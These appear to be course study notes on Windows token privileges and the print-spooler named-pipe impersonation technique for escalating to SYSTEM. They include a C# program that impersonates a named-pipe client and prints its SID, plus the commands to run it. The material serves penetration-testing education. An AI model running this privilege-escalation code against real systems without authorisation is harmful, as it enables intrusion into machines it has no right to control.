# Integrity levels
    Low - Low integrity is used with sandbox processes like web browsers
    Medium- Applications executing in the context of a regular user run at medium integrity
    High- administrators can execute applications at high integrity.
    System- used for SYSTEM services

Local administrators receive two access tokens when authenticating. first onfigured to create processes as medium integrity. 
When a user selects the "Run as administrator" option for an application, the second elevated token is used instead, and allows the process to run at high integrity.

we can easily view the available privileges for the current user with whoami from cmd.exe by specifying the /priv flag: whoami /priv
mpersonation tokens have four levels: Anonymous, Identification, Impersonation, and Delegation.10 Anonymous and Identification only allow enumeration of information.
For example, let's assume a user authenticates to a web server and performs an action on that server that requires a database lookup. The web service could use delegation to pass authentication to the database server "through" the web server.


In the past, security researchers have identified1 nine different privileges that may allow for privilege escalation from medium integrity to either high
integrity or system integrity, or enable compromise of processes running as another authenticated user.

-> SeImpersonatePrivilege allows us to impersonate any token for which we can get a reference, or handle. 
This privilege is quite interesting since the built-in Network Service account, the LocalService3 account, and the default IIS account have it assigned by default. 
Because of this, gaining code execution on a web server will often give us access to this privilege and potentially offer the possibility to escalate our access.

-> If we have the SeImpersonatePrivilege privilege we can often use the Win32 DuplicateTokenEx4 API to create a primary token from an impersonation token and 
create a new process in the context of the impersonated user.

-> When no tokens related to other user accounts are available in memory, we can likely force the SYSTEM account to give us a token that we can impersonate.

-> Pipes are a means of interprocess communication (IPC),7 just like RPC, COM, or even network sockets.

-> A pipe is a section of shared memory inside the kernel that processes can use for communication. One process can create a pipe (the pipe server) 
while other processes can connect to the pipe (pipe clients) and read/write information from/to it, depending on the configured access rights for a given pipe.

-> Anonymous8 pipes are typically used for communication between parent and child processes, while named9 pipes are more broadly used. 
In our examples we'll make use of named pipes, because they have more functionality and more importantly, they support impersonation.


->The attack that we are going to simulate can force the SYSTEM account to connect to a named pipe set up by an attacker.

While the technique was originally developed as part of an Active Directory attack, it can also be used locally. 
It is based on the print spooler service, which is started by default and runs in a SYSTEM context.c

-> We'll discuss the technique in more detail later. For now, it's important to understand that the attack is 
based on the fact that the print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes. 
->If we can create a process running with the SeImpersonatePrivilege privilege that simulates a print client, we will obtain a SYSTEM token that we can impersonate.


Below code needs to run in context of user account that has the SeImpersonatePrivilege access Rights


using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            ConnectNamedPipe(hPipe, IntPtr.Zero);
            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"Found sid {0}", sidstr);
        }
    }
}

Run it from user with privileges mentioned above
PrintSpooferNet.exe \\.\pipe\test

To simulate a connection, we can open an elevated command prompt and write to the pipe as shown below:
echo hello > \\localhost\pipe\test


